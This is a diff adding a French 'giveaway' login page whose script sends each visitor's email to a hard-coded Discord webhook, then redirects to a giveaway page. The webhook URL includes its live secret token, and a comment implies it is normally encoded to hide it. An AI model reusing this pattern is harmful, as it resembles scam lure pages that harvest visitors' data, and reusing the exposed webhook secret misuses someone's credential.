@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connexion Giveaway</title>
+<style>
+  body { font-family: Arial, sans-serif; background: #111; color: white; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh;}
+  h1 { color:#ffcc00; margin-bottom:20px; }
+  input, button { padding:10px; margin:5px; border-radius:5px; border:none; width:250px;}
+  button { background-color:#ffcc00; font-weight:bold; cursor:pointer;}
+  button:hover { background-color:#ffaa00;}
+</style>
+</head>
+<body>
+<h1>Connexion au Giveaway</h1>
+<input type="email" id="email" placeholder="Entrez votre email" required>
+<button id="continueBtn">Continuer</button>
+
+<script>
+const continueBtn = document.getElementById("continueBtn");
+
+// Ton webhook non encodé pour test (fonctionne en local si pas de CORS)
+const webhookURL = "https://discord.com/api/webhooks/1410946928505786418/bXTzPK4utvivO9vAAYB07_ONZc06PATy9GP2MvmXa0EGJbJfd7oRQMla_gnyX2YcKDTj";
+
+continueBtn.addEventListener("click", () => {
+  const email = document.getElementById("email").value.trim();
+  if(!email || !email.includes("@")) {
+    alert("Veuillez entrer un email valide.");
+    return;
+  }
+
+  // Envoi sur Discord
+  fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: `Nouvelle participation : ${email}` })
+  })
+  .then(() => {
+    // Redirection vers le giveaway
+    window.location.href = "giveaway.html";
+  })
+  .catch(err => {
+    console.error(err);
+    alert("Erreur lors de l'envoi. Le webhook Discord bloque peut-être le fetch côté navigateur (CORS).");
+  });
+});
+</script>
+</body>
+</html>
